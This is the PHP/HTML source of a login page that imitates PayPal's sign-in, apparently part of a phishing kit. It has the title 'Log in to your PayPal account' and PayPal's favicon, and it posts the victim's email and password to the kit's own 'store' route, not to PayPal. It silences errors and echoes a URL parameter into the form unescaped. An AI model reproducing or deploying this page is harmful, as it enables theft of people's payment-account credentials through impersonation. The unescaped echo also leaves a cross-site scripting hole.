<?php
  error_reporting(0);
  $return_email = $_GET['return_access'];
  if(empty($return_email)){
    $return_email = "";
  }else{
    $return_email = $_GET['return_access'];
  }
?>
<!DOCTYPE html>
<html>
  <head>
    <head>
      <meta charset="utf-8">
      <title> Log in to your PayPal account </title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script src="../js/ajax.js" charset="utf-8"></script>
      <script src="../js/jquery.js" charset="utf-8"></script>
      <script src="../js/jquery.min.js" charset="utf-8"></script>
      <link rel="stylesheet" href="../css/styles.css">
      <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
      <link href="https://file.myfontastic.com/hSMyDca9BDwBA8GgvxRZRP/icons.css" rel="stylesheet">
    </head>
  </head>
  <body>
    <div class="bg"></div>
    <a href="./"><div class="logo"></div></a>
    <div class="panels bottom" id="former">
      <img src="../css/logo.png" alt="">
      <br><br>
      <form class="description" method="post" action="{{ route('store') }}" autocomplete="off" style="text-align: center;">
        <div class="inp_text" id="login_email">
          <input type="text" name="login_email" alt="dead" value="<?php echo $return_email ?>" placeholder="Email">
          <div class="mark email" data-icon="d"></div>
        </div>
        <div class="inp_text" id="login_password">
          <input type="password" name="login_password" alt="dead" value="" placeholder="Password">
          <div class="mark password" data-icon="d"></div>
        </div>
        <br><br>
        <div class="btns" name="login_submit">
          Log In
          <div class="children"></div>
        </div>
        <br><br>
        <a href="#">Having trouble logging in?</a>
      </form>
      <div class="loader" id="loader">
        <div class="load"></div>
      </div>
    </div>
    <script type="text/javascript">
      <?php include '../js/js-plus.js'; ?>
    </script>
  </body>
</html>
